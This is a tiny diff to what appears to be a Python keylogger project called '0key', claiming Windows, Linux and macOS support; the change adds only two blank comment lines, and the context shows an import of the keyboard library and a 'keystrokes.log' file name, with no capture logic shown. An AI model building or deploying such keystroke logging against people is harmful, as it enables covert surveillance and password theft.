@@ -2,6 +2,8 @@
 # 0key keylogger 
 # windows - linux - Macos
 # github - gitlab
+# -
+# - 
 
 import keyboard
 log_file = "keystrokes.log"
